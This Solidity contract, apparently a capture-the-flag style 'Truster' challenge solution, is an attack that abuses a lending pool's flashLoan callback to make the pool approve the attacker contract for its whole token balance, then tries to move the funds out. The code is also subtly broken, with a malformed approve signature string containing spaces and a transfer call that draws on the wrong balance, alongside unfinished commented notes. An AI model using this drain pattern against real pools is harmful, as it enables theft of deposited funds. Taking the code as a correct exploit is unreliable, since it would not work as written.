pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

interface IPoolFunc {
    function flashLoan(
        uint256 borrowAmount,
        address borrower,
        address target,
        bytes calldata data
        ) external;
}

contract TrusterAttack {
    using Address for address;
    
    constructor(address poolAddress,
                address tokenAddress,
                address attackerAddress
                )
    {
        //Idea

        //call flashLoan with x borrowAmount, borrower = this
        //target = token 
        uint256 balance = IERC20(tokenAddress).balanceOf(poolAddress);
        IPoolFunc(poolAddress).flashLoan(
            0,
            address(this),
            tokenAddress,
            abi.encodeWithSignature(
                "approve(address , uint256) ",
                address(this),
                balance
            )
        );
        //IERC20(tokenAddress).transfer(attackerAddress, balance);
        //calldata = approve(pool, this)
        //response 
        //token.tranfser(amount,attacker)
        //
    }
    function transferMe(address tokenAddress, address attackerAddress, address poolAddress) public{
        uint256 balance2 = IERC20(tokenAddress).balanceOf(poolAddress);
        IERC20(tokenAddress).transfer(attackerAddress, balance2);
    }

   
}